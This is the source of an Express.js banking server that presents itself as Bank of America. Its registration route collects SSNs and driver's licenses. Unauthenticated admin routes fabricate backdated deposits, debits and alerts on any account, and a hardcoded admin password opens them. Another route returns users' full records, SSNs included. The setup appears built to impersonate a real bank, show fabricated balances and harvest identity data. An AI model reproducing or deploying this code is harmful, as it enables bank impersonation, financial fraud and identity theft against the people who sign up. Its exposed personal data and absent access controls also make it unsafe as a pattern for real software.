const express = require('express');
const bodyParser = require('body-parser');
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 7860;

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static('public'));

const usersFile = path.join(__dirname, 'data', 'users.json');
const accountsFile = path.join(__dirname, 'data', 'accounts.json');
const transactionsFile = path.join(__dirname, 'data', 'transactions.json');
const notificationsFile = path.join(__dirname, 'data', 'notifications.json');

if (!fs.existsSync(path.join(__dirname, 'data'))) fs.mkdirSync(path.join(__dirname, 'data'));

function readJSON(file) { return fs.existsSync(file) ? JSON.parse(fs.readFileSync(file, 'utf8') || '[]') : []; }
function writeJSON(file, data) { fs.writeFileSync(file, JSON.stringify(data, null, 2)); }
function hashPassword(pwd) { return crypto.createHash('sha256').update(pwd).digest('hex'); }
function generateId(prefix) { return prefix + Date.now() + Math.random().toString(36).substr(2, 5).toUpperCase(); }

// --- DATE HELPER (THE FIX) ---
function getSafeDate(dateStr) {
    if (!dateStr) return new Date().toISOString();

    // 1. If it's just a Date (YYYY-MM-DD), force it to 8 PM UTC (Safe for all timezones)
    if (dateStr.length === 10 && dateStr.includes('-')) {
        return `${dateStr}T20:00:00.000Z`;
    }

    // 2. If it's a Date+Time (YYYY-MM-DDTHH:mm), add 6 hours buffer
    // This prevents 1 AM UTC from becoming 8 PM Yesterday in EST.
    try {
        const d = new Date(dateStr);
        // Add 6 hours (6 * 60 * 60 * 1000 milliseconds)
        d.setTime(d.getTime() + (6 * 60 * 60 * 1000)); 
        return d.toISOString();
    } catch (e) {
        return new Date().toISOString();
    }
}

function createNotification(userId, title, message, type, transactionId = null, customDate = null) {
    const notifications = readJSON(notificationsFile);
    const timeToUse = customDate ? customDate : new Date().toISOString();
    
    const notification = {
        notificationId: generateId('NOT'),
        userId, title, message, type, transactionId,
        isRead: false,
        timestamp: timeToUse
    };
    notifications.push(notification);
    writeJSON(notificationsFile, notifications);
}

// --- AUTH ---
app.post('/api/register', (req, res) => {
    try {
        const { firstName, lastName, email, phone, password, dob, ssn, driversLicense } = req.body;
        if (!firstName || !email || !password) return res.status(400).json({ message: 'Missing fields' });
        
        const users = readJSON(usersFile);
        if (users.some(u => u.email === email)) return res.status(400).json({ message: 'Email exists' });

        const userId = generateId('USR');
        const newUser = {
            userId, firstName, lastName, email, phone, dob, ssn, driversLicense,
            passwordHash: hashPassword(password),
            status: 'successful',
            authVerification: { enabled: false, authName: '', authCode: '' },
            createdAt: new Date().toISOString()
        };
        users.push(newUser);
        writeJSON(usersFile, users);

        const accounts = readJSON(accountsFile);
        accounts.push(
            { accountId: generateId('ACC'), userId, accountNumber: Math.floor(1000000000 + Math.random() * 9000000000).toString(), accountName: 'Checking', balance: 0, availableBalance: 0, status: 'active' },
            { accountId: generateId('ACC'), userId, accountNumber: Math.floor(1000000000 + Math.random() * 9000000000).toString(), accountName: 'Savings', balance: 0, availableBalance: 0, status: 'active' }
        );
        writeJSON(accountsFile, accounts);

        res.json({ message: 'Success', userId, token: generateId('TOK') });
    } catch (e) { res.status(500).json({ message: 'Error' }); }
});

app.post('/api/login', (req, res) => {
    const { email, password } = req.body;
    if (email === 'admin@bankofAmerica.com' && password === '3s8ZG9gwFTXe') {
        return res.json({ message: 'Admin', userId: 'admin', token: 'admin-token', isAdmin: true });
    }
    const users = readJSON(usersFile);
    const user = users.find(u => u.email === email && u.passwordHash === hashPassword(password));
    if (!user) return res.status(401).json({ message: 'Invalid credentials' });
    res.json({ message: 'Success', userId: user.userId, token: generateId('TOK') });
});

app.get('/api/user/:userId', (req, res) => {
    const user = readJSON(usersFile).find(u => u.userId === req.params.userId);
    if (!user) return res.status(404).json({ message: 'User not found' });
    res.json(user);
});

app.get('/api/accounts/:userId', (req, res) => {
    res.json(readJSON(accountsFile).filter(a => a.userId === req.params.userId));
});

// --- USER TRANSACTION ---
app.post('/api/transactions', (req, res) => {
    try {
        const { fromAccountId, toAccountNumber, amount, type, description, recipientName } = req.body;
        if (!fromAccountId || !amount) return res.status(400).json({ message: 'Invalid data' });

        const accounts = readJSON(accountsFile);
        const fromAccount = accounts.find(a => a.accountId === fromAccountId);
        if (!fromAccount) return res.status(404).json({ message: 'Account not found' });

        if (fromAccount.balance < amount) return res.status(400).json({ message: 'Insufficient funds' });

        fromAccount.balance -= parseFloat(amount);
        fromAccount.availableBalance -= parseFloat(amount);

        let toAccount = null;
        if (toAccountNumber && type === 'internal') {
            toAccount = accounts.find(a => a.accountNumber === toAccountNumber);
            if (toAccount) {
                toAccount.balance += parseFloat(amount);
                toAccount.availableBalance += parseFloat(amount);
            }
        }
        writeJSON(accountsFile, accounts);

        const transactionId = generateId('TRX');
        const transaction = {
            transactionId,
            fromAccountId,
            toAccountId: toAccount ? toAccount.accountId : null,
            fromUserId: fromAccount.userId,
            toUserId: toAccount ? toAccount.userId : null,
            amount: parseFloat(amount),
            type,
            description: description || 'Transfer',
            recipientName: toAccount ? '' : (recipientName || 'External'),
            status: 'completed',
            timestamp: new Date().toISOString()
        };

        const transactions = readJSON(transactionsFile);
        transactions.push(transaction);
        writeJSON(transactionsFile, transactions);

        createNotification(fromAccount.userId, 'Money Sent', `You sent $${amount} via ${type}`, 'debit', transactionId);
        if (toAccount) createNotification(toAccount.userId, 'Money Received', `You received $${amount}`, 'credit', transactionId);

        res.json({ message: 'Success', transaction });
    } catch (e) { res.status(500).json({ message: 'Server Error' }); }
});

// --- ADMIN ROUTES (ALL USE getSafeDate) ---

app.post('/api/admin/transaction', (req, res) => {
    try {
        const { accountNumber, amount, type, merchant, date } = req.body;
        const accounts = readJSON(accountsFile);
        const account = accounts.find(a => a.accountNumber === accountNumber);
        
        if (!account) return res.status(404).json({ message: 'Account not found' });

        const amt = parseFloat(amount);
        if (type === 'credit') {
            account.balance += amt;
            account.availableBalance += amt;
        } else {
            account.balance -= amt;
            account.availableBalance -= amt;
        }
        writeJSON(accountsFile, accounts);

        // Apply Safe Date Logic
        const finalDate = getSafeDate(date);

        const transactionId = generateId('TRX');
        const description = merchant || (type === 'credit' ? 'Deposit' : 'Withdrawal');

        const transaction = {
            transactionId,
            fromAccountId: type === 'debit' ? account.accountId : null,
            toAccountId: type === 'credit' ? account.accountId : null,
            fromUserId: type === 'debit' ? account.userId : 'admin',
            toUserId: type === 'credit' ? account.userId : 'admin',
            amount: amt,
            type: type === 'credit' ? 'deposit' : 'withdrawal',
            description: description,
            recipientName: merchant || 'Admin Transaction',
            status: 'completed',
            timestamp: finalDate
        };

        const transactions = readJSON(transactionsFile);
        transactions.push(transaction);
        writeJSON(transactionsFile, transactions);

        const notifTitle = type === 'credit' ? 'Deposit Received' : 'Transaction Alert';
        createNotification(account.userId, notifTitle, `${description}: $${amt.toFixed(2)}`, type === 'credit' ? 'credit' : 'debit', transactionId, finalDate);

        res.json({ success: true, message: 'Transaction created' });
    } catch (e) {
        console.error(e);
        res.status(500).json({ success: false, message: 'Server Error: ' + e.message });
    }
});

app.post('/api/admin/fund-account', (req, res) => {
    try {
        const { accountNumber, amount, description, date } = req.body; 
        const accounts = readJSON(accountsFile);
        const account = accounts.find(a => a.accountNumber === accountNumber);
        if (!account) return res.status(404).json({ message: 'Not found' });

        account.balance += parseFloat(amount);
        account.availableBalance += parseFloat(amount);
        writeJSON(accountsFile, accounts);

        const finalDate = getSafeDate(date);
        const transactionId = generateId('TRX');
        const descText = description || 'Deposit';
        
        const transaction = {
            transactionId, toAccountId: account.accountId, fromUserId: 'admin', toUserId: account.userId,
            amount: parseFloat(amount), type: 'admin-funding', description: descText, 
            recipientName: 'Bank of America', 
            status: 'completed', timestamp: finalDate
        };
        const transactions = readJSON(transactionsFile);
        transactions.push(transaction);
        writeJSON(transactionsFile, transactions);
        
        createNotification(account.userId, 'Deposit Received', `${descText}: $${parseFloat(amount).toFixed(2)}`, 'credit', transactionId, finalDate);
        res.json({ message: 'Funded' });
    } catch (e) { res.status(500).json({ message: 'Error' }); }
});

app.post('/api/admin/debit-account', (req, res) => {
    try {
        const { accountNumber, amount, note, date } = req.body;
        const accounts = readJSON(accountsFile);
        const account = accounts.find(a => a.accountNumber === accountNumber);
        if (!account) return res.status(404).json({ message: 'Not found' });

        account.balance -= parseFloat(amount);
        account.availableBalance -= parseFloat(amount);
        writeJSON(accountsFile, accounts);

        const finalDate = getSafeDate(date);
        const transactionId = generateId('TRX');
        const descText = note || 'Withdrawal';

        const transaction = {
            transactionId, fromAccountId: account.accountId, fromUserId: account.userId, toUserId: 'admin',
            amount: parseFloat(amount), type: 'admin-debit', description: descText, 
            recipientName: 'Service Charge', 
            status: 'completed', timestamp: finalDate
        };
        const transactions = readJSON(transactionsFile);
        transactions.push(transaction);
        writeJSON(transactionsFile, transactions);

        createNotification(account.userId, 'Transaction Alert', `${descText}: $${parseFloat(amount).toFixed(2)}`, 'debit', transactionId, finalDate);
        res.json({ message: 'Debited' });
    } catch (e) { res.status(500).json({ message: 'Error' }); }
});

app.get('/api/admin/users', (req, res) => res.json(readJSON(usersFile)));
app.put('/api/admin/user/:userId', (req, res) => {
    const users = readJSON(usersFile);
    const user = users.find(u => u.userId === req.params.userId);
    if(user) { Object.assign(user, req.body); writeJSON(usersFile, users); res.json({message:'Updated'}); }
    else res.status(404).json({message:'Not found'});
});
app.get('/api/admin/accounts-summary', (req, res) => res.json({ totalBalance: readJSON(accountsFile).reduce((s,a)=>s+a.balance,0) }));
app.get('/api/debug/accounts', (req, res) => {
    const users = readJSON(usersFile);
    res.json(readJSON(accountsFile).map(a => ({...a, userName: (users.find(u=>u.userId===a.userId)||{}).firstName || 'Unknown'})));
});

app.get('/api/transactions/:userId', (req, res) => {
    const trans = readJSON(transactionsFile).filter(t => t.fromUserId === req.params.userId || t.toUserId === req.params.userId);
    res.json(trans.sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp)));
});
app.get('/api/notifications/:userId', (req, res) => {
    const notes = readJSON(notificationsFile).filter(n => n.userId === req.params.userId).sort((a,b) => new Date(b.timestamp) - new Date(a.timestamp));
    res.json(notes);
});
app.put('/api/notifications/:id/read', (req, res) => {
    const notes = readJSON(notificationsFile);
    const n = notes.find(x => x.notificationId === req.params.id);
    if(n) { n.isRead = true; writeJSON(notificationsFile, notes); }
    res.json({success:true});
});
app.get('/api/notifications/:userId/unread-count', (req, res) => {
    res.json({ unreadCount: readJSON(notificationsFile).filter(n => n.userId === req.params.userId && !n.isRead).length });
});
app.get('/api/verify-account/:acc', (req, res) => {
    const acc = readJSON(accountsFile).find(a => a.accountNumber === req.params.acc);
    if(!acc) return res.status(404).json({message:'Not found'});
    const user = readJSON(usersFile).find(u => u.userId === acc.userId);
    res.json({ accountNumber: acc.accountNumber, accountName: acc.accountName, userName: user ? user.firstName : 'User' });
});

app.listen(PORT, () => console.log(`Server running on port ${PORT}`));
